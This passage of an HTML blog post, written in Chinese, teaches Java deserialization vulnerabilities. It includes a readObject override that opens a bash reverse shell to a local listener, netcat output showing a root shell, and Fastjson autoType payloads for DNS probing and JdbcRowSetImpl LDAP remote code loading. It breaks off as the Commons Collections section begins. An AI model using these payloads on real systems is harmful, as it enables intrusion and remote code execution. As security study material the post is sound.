@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;📖&lt;/text&gt;&lt;/svg&gt;">
+
+<style>
+  :root {
+    font-size: 15px;
+  }
+</style>
+  <title>Java反序列化漏洞学习&nbsp;|&nbsp;Roadmap of Learning</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Java反序列化漏洞学习">
+  
+    <meta name="description" content="Java对象的传输往往通过序列化、反序列化的方式进行，通过调用公用的第三方组件，开发者可以快速实现自己的代码逻辑。比如在在一个HTTP Server中，客户端发送的数据通过序列化转为xml、json等约定格式方便开发、调试，服务端只需要调用API接口即可读取处理数据。不过在实际的应用中，这里的安全问题往往容易被忽略。">
+    <meta property="og:description" content="Java对象的传输往往通过序列化、反序列化的方式进行，通过调用公用的第三方组件，开发者可以快速实现自己的代码逻辑。比如在在一个HTTP Server中，客户端发送的数据通过序列化转为xml、json等约定格式方便开发、调试，服务端只需要调用API接口即可读取处理数据。不过在实际的应用中，这里的安全问题往往容易被忽略。">
+  
+  
+    <meta property="og:image" content="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🍵&lt;/text&gt;&lt;/svg&gt;">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="index.html">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;📖&lt;/text&gt;&lt;/svg&gt;"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="project.html">
+        <div class="Navbar__Btn">
+          
+            <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;📽️&lt;/text&gt;&lt;/svg&gt;"></span>&nbsp;
+          
+          <span>Project</span>
+        </div>
+      </a>
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="about.html">
+        <div class="Navbar__Btn">
+          
+            <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🙋🏻‍♂️&lt;/text&gt;&lt;/svg&gt;"></span>&nbsp;
+          
+          <span>About</span>
+        </div>
+      </a>
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="data:image/svg+xml,&lt;svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22&gt;&lt;text text-anchor=%22middle%22 dominant-baseline=%22middle%22 x=%2250%22 y=%2255%22 font-size=%2280%22&gt;🍵&lt;/text&gt;&lt;/svg&gt;"></span>
+      </div>
+    
+    <h1 class="Header__Title">Java反序列化漏洞学习</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, Aug 9, 2022</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--purple">
+            <a href="tag/Java.html">Java</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/8e113e4117d94f1eb69184a3b837f2d4" class="PageRoot PageRoot--FullWidth"><div id="https://www.notion.so/c1673af3b1f44883a8fdb71a1ba1e709" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Java对象的传输往往通过序列化、反序列化的方式进行，通过调用公用的第三方组件，开发者可以快速实现自己的代码逻辑。比如在在一个HTTP Server中，客户端发送的数据通过序列化转为xml、json等约定格式方便开发、调试，服务端只需要调用API接口即可读取处理数据。不过在实际的应用中，这里的安全问题往往容易被忽略。</span></span></p></div><h2 id="https://www.notion.so/1dff085cd3ce4754a4c199865e4a4c33" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/1dff085cd3ce4754a4c199865e4a4c33"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Java反序列化漏洞成因</span></span></h2><div id="https://www.notion.so/41829a2d04464909b1932a9fd399874c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Java中有原生的序列化方法，通过调用java.io.ObjectOutputStream可以将对象转换为字节码，如下所示：</span></span></p></div><pre id="https://www.notion.so/f19edc994fe7437b9b1850bf341b5bbb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>package com.test;
+import java.io.*;
+public class Book implements Serializable
+{
+    public String name;
+    public int price;
+    public Book(String name,int price){
+        this.name = name;
+        this.price = price;
+    }
+}
+public class Main {
+    public static void main(String args[])throws Exception{
+        Book s = new Book(&quot;Helloworld&quot;,9999);
+        FileOutputStream f=new FileOutputStream(&quot;book.bin&quot;);
+        ObjectOutputStream os = new ObjectOutputStream(f);
+        os.writeObject(s);
+        os.close();
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/f537ce1661b84864b0a1a20bb444904f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行上面的代码，在本地目录可以看到保存book对象的字节码文件</span></span></p></div><pre id="https://www.notion.so/7dafda53edad4d78a0621bc6ac9db03a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ xxd book.bin
+00000000: aced 0005 <span class="token number">7372</span> 000d 636f 6d2e <span class="token number">7465</span> <span class="token number">7374</span>  <span class="token punctuation">..</span><span class="token punctuation">..</span>sr<span class="token punctuation">..</span>com.test
+00000010: 2e42 6f6f 6ba5 0b34 59d8 b59c <span class="token number">4302</span> 0002  .Book<span class="token punctuation">..</span>4Y<span class="token punctuation">..</span>.C<span class="token punctuation">..</span>.
+00000020: <span class="token number">4900</span> 0570 <span class="token number">7269</span> <span class="token number">6365</span> 4c00 046e 616d <span class="token number">6574</span>  I<span class="token punctuation">..</span>priceL<span class="token punctuation">..</span>namet
+00000030: 0012 4c6a <span class="token number">6176</span> 612f 6c61 6e67 2f53 <span class="token number">7472</span>  <span class="token punctuation">..</span>Ljava/lang/Str
+00000040: 696e 673b <span class="token number">7870</span> 0000 270f <span class="token number">7400</span> 0a48 656c  ing<span class="token punctuation">;</span>xp<span class="token punctuation">..</span>'.t<span class="token punctuation">..</span>Hel
+00000050: 6c6f 776f 726c <span class="token number">64</span>                        loworld</span></span></span></code></pre><div id="https://www.notion.so/7592e53ee41a4989bebafe52b153b661" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">当读取文件进行反序列化时，调用java.io.ObjectInputStream，不过在反序列化的过程中，java会自动地调用类中的readObject方法。如下所示，如果将类的readObject重载为下面的危险函数，即可实现任意代码执行的效果。</span></span></p></div><pre id="https://www.notion.so/292d77f109544df397bc4808b2098fff" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>package com.test;
+import java.io.*;
+public class Book implements Serializable
+{
+    public String name;
+    public int price;
+    public Book(String name,int price){
+        this.name = name;
+        this.price = price;
+    }
+    private void readObject(ObjectInputStream in) throws IOException{
+        String[] cmd = {&quot;bash&quot;,&quot;-c&quot;,&quot;bash &gt; /dev/tcp/127.0.0.1/1234 0&lt;&amp;1&quot;};
+        Runtime.getRuntime().exec(cmd);
+    }
+}
+public class Main {
+    public static void main(String args[])throws Exception{
+        Book s = new Book(&quot;Helloworld&quot;,9999);
+        FileOutputStream f = new FileOutputStream(&quot;book.bin&quot;);
+        ObjectOutputStream oos = new ObjectOutputStream(f);
+        oos.writeObject(s);
+        oos.close();
+
+        FileInputStream fi = new FileInputStream(&quot;book.bin&quot;);
+        ObjectInputStream ois =new ObjectInputStream(fi);
+        Book d2=(Book)ois.readObject();
+        ois.close();
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/c995faea2f10486e9d0df3b85ca8a67a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在本地监听1234端口，运行上述代码，即可实现反弹shell。</span></span></p></div><pre id="https://www.notion.so/11db51f8150d4284bfff8385a1e6832c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ <span class="token function">nc</span> -lvn <span class="token number">1234</span>
+Listening on <span class="token punctuation">[</span><span class="token number">0.0</span>.0.0<span class="token punctuation">]</span> <span class="token punctuation">(</span>family <span class="token number">2</span>, port <span class="token number">1234</span><span class="token punctuation">)</span>
+Connection from <span class="token number">127.0</span>.0.1 <span class="token number">41608</span> received<span class="token operator">!</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/8938ec15bd044a9d8f9d44ffe1a693be" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">上面的这种情况只是为了介绍序列化反序列化的一个例子，实际开发中没有人会在readObject函数中写这样的危险函数，但是Java的第三方库繁多，还是有很多公共组件漏洞有着和上面类似的原理。</span></span></p></div><h2 id="https://www.notion.so/5500ba8d404a4b5a8ea426e87d4b2448" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/5500ba8d404a4b5a8ea426e87d4b2448"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Fastjson反序列化漏洞</span></span></h2><div id="https://www.notion.so/3cfecff8ed55457bb00ba309a1731806" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">fastjson在反序列化时有一个非常方便开发人员使用的功能autotype，它允许开发人员不指定被转译的Object类型，自动化地声明对象。下面是一个使用样例，Fastjson的版本为</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">1.2.24</code></span><span class="SemanticString">：</span></span></p></div><pre id="https://www.notion.so/f147aa7875334451b8e2e6f733aeb0e6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>package com.test;
+import java.io.*;
+import org.apache.commons.io.FileUtils;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.annotation.JSONField;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+class Book
+{
+    @JSONField(name = &quot;name&quot;)
+    public String name;
+    @JSONField(name = &quot;price&quot;)
+    public int price;
+
+    public Book(String name,int price){
+        this.name = name;
+        this.price = price;
+    }
+}
+
+public class Main
+{
+    public static void main(String args[]) throws java.io.IOException  {
+        File file = new File(args[0]);
+        String poc = FileUtils.readFileToString(file, &quot;UTF-8&quot;);
+        ParserConfig config = new ParserConfig();
+        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
+        System.out.println(obj);
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/78128343a4ec48319ddee177996abb37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">上面的程序会将命令行参数作为文件路径，读取指定内容作为反序列化的数据。</span></span></p></div><pre id="https://www.notion.so/718bca9213f84da6bd6ffc684ffe950c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ cat book.json
+{
+    &quot;@type&quot;:&quot;com.test.Book&quot;,
+    &quot;price&quot;:1,
+    &quot;name&quot;:&quot;asd&quot;
+}
+$ java -jar target/test-1.jar book.json
+com.test.Book@7de26db8</span></span></span></code></pre><div id="https://www.notion.so/2c490461108b4d12ad1b5517bcb41f8e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">从上面可见通过指定“@type”字段，fastjson会将json转译为指定的Object。</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed">如果在一个CS架构中，json字符串是从客户端发送过来的，那么攻击者可以通过构造特殊的type，来实现一些意想不到的效果。</mark></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/77b3cda162ec45d28ce36bd7843a77bd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">DNS探测服务端是否使用fastjson</span></span></li></ul><pre id="https://www.notion.so/9aa81face44447299e6f9ea2d64d6538" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;}</span></span></span></code></pre><ul class="BulletedListWrapper"><li id="https://www.notion.so/186797dd848444f783bb60ef69e3fc04" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">通过JdbcRowSetImpl加载远程可执行文件实现任意代码执行</span></span></li></ul><pre id="https://www.notion.so/df07dc1bf5214f74b5b529c492bd90da" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>{
+    &quot;a&quot;:{
+        &quot;@type&quot;:&quot;java.lang.Class&quot;,
+        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+    },
+    &quot;b&quot;:{
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/badNameClass&quot;,
+        &quot;autoCommit&quot;:true
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/0401580b464c4cb9aa603e99e8c7d46a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">针对fastjson的利用技巧有多种多样，可以参考</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></span><span class="SemanticString">学习更多的利用姿势。同时官方针对此问题做了一系列的加固措施，如使用黑名单禁用了危险类，后序的版本中默认禁用了autoType功能。</span></span></p><div class="Text__Children"><blockquote id="https://www.notion.so/ba20a7e5da7f460cadeddeb2a12b4d68" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">额外说明一点，并不是所有的类型都是可以被autoType转译的，需要满足以下任意一个条件：
+1. 类型中需要存在以get、set开头的方法才能被自动转译
+2. 属于fastjson预先声明好的一些类型：</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">InetSocketAddress</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">UUID</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">URI</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">URL</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Pattern</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Locale</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SimpleDateFormat</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">InetAddress</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Inet4Address</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Inet6Address</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">File</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">TimeZone</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Charset</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Currency</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">JSONPath</code></span><span class="SemanticString">、</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">java.nio.file.Path</code></span><span class="SemanticString">，参考自</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">com.alibaba.fastjson.serializer.MiscCodec:deserialze</code></span></span></blockquote></div></div><h2 id="https://www.notion.so/de6b03139ebf4922982cce73ed2ba8be" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/de6b03139ebf4922982cce73ed2ba8be"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Apache Commons Collections反序列化漏洞</span></span></h2><div id="https://www.notion.so/a04b95e488914791bf87c02e067fc572" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">实验环境：</span></span></p></div><div id="https://www.notion.so/d186234088ff450699697775ab874a5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">commons-collections 3.2.1</span></span></p></div><div id="https://www.notion.so/09070beade9c45878214bba5fbbc460e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">jdk版本 jdk1.7.0_80</span></span></p></div><div id="https://www.notion.so/5ece316fa6834c6daef9e8b0cf93682b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Commons Collections库提供了丰富的数据结构，使数据的收集处理变得容易：</span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/aff3deab655c48a3a774f365b2202dfd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Bag</strong></span><span class="SemanticString"> - Bag界面简化了每个对象具有多个副本的集合。</span></span></li><li id="https://www.notion.so/f66e0f6ab2d74bc2b0772ec8cd0ebcf1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">BidiMap</strong></span><span class="SemanticString"> - BidiMap接口提供双向映射，可用于使用值使用键或键查找值。</span></span></li><li id="https://www.notion.so/75c3c6b6ad03445684bb4eb5c01086ea" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">MapIterator</strong></span><span class="SemanticString"> - MapIterator接口提供简单而容易的迭代迭代。</span></span></li><li id="https://www.notion.so/44fac996848b483f95b0193aa12a52a0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Transforming Decorators</strong></span><span class="SemanticString"> - 转换装饰器可以在将集合添加到集合时更改集合的每个对象。</span></span></li><li id="https://www.notion.so/340323e6852b4e369b81eb352c269e8e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Composite Collections</strong></span><span class="SemanticString"> - 在需要统一处理多个集合的情况下使用复合集合。</span></span></li><li id="https://www.notion.so/768457147ce942f7b29320d1b4d5322e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Ordered Map</strong></span><span class="SemanticString"> - 有序地图保留添加元素的顺序。</span></span></li><li id="https://www.notion.so/cbd8f4b40b5d42c28e27c99f79df2b40" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Ordered Set</strong></span><span class="SemanticString"> - 有序集保留了添加元素的顺序。</span></span></li><li id="https://www.notion.so/d224bb349a2d4c1b830b487a30de760f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Reference map</strong></span><span class="SemanticString"> - 参考图允许在密切控制下对键/值进行垃圾收集。</span></span></li><li id="https://www.notion.so/4a1fa83a7968454ebe8597864fe95677" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Comparator implementations</strong></span><span class="SemanticString"> - 可以使用许多Comparator实现。</span></span></li><li id="https://www.notion.so/552bf24290a744e68cc5f9ddedf7209e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Iterator implementations</strong></span><span class="SemanticString"> - 许多Iterator实现都可用。</span></span></li><li id="https://www.notion.so/58fa9e33849240c4b96cbaaf3a369d60" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Adapter Classes</strong></span><span class="SemanticString"> - 适配器类可用于将数组和枚举转换为集合。</span></span></li><li id="https://www.notion.so/314084e0508d48c5b608f0be5127b2ad" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Utilities</strong></span><span class="SemanticString"> - 实用程序可用于测试测试或创建集合的典型集合论属性，例如union，intersection。 支持关闭。</span></span></li></ul><div id="https://www.notion.so/9a3adde5676345ce925809f11dabbfb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">先来学习一下</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Transforming Decorators</strong></span><span class="SemanticString">这个数据结构</span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">，它</strong></span><span class="SemanticString">能在Map添加元素时动态对key、value进行修改，如下：</span></span></p></div><pre id="https://www.notion.so/85b7e345a91640ea9919adcc0543cf8e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>package com.Exp;
+
+import org.apache.commons.collections.*;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.security.Key;
+import java.util.HashMap;
+import java.util.Map;
+
+public class ValueWrapper implements Transformer {
+// 将value添加前缀“value_”
+    public Object transform(Object input) {
+        String a = (String) input;
+        return (Object) (&quot;value_&quot; + a);
+    }
+}
+class KeyWrapper implements Transformer {
+// 将key添加前缀“key_”
+    public Object transform(Object input) {
+        String a = (String) input;
+        return (Object) (&quot;key_&quot; + a);
+    }
+}
+public class Main {
+    public static void main(String[] args) throws Exception {
+        HashMap&lt;String, String&gt; innerMap = new HashMap&lt;String, String&gt;();
+        KeyWrapper k = new KeyWrapper();
+        ValueWrapper v = new ValueWrapper();
+        Map trsMap = TransformedMap.decorate(innerMap, k, v);
+        trsMap.put(&quot;1&quot;, &quot;helloworld&quot;);
+        System.out.println(trsMap);
+    }
+}</span></span></span></code></pre><div id="https://www.notion.so/fe0621ec438e4c959b49dadf1012e61f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">运行上面的代码，可以看到下面的结果。所有的key value都加了前缀。</span></span></p></div><pre id="https://www.notion.so/428b582369234e198e61f9103dd6a07d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ java -jar target/cc-1.jar
+<span class="token punctuation">{</span>key_1<span class="token operator">=</span>value_helloworld<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/02a71cc395664f2b9cf2e53fa83757ba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">在上面的代码中我们使用了自定义的Transformer进行操作。实际上这个库里还有很多已经集成好的Treansformer，其中，有几个关键的类，可以帮助我们构造任意执行的代码。</span></span></p></div><h2 id="https://www.notion.so/3a9bf5f2a71d44e7af2e926b75c04393" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/3a9bf5f2a71d44e7af2e926b75c04393"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">几个危险的Transformer</span></span></h2><h2 id="https://www.notion.so/46437d48ad624ed6a6a7148e755bab72" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/46437d48ad624ed6a6a7148e755bab72"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 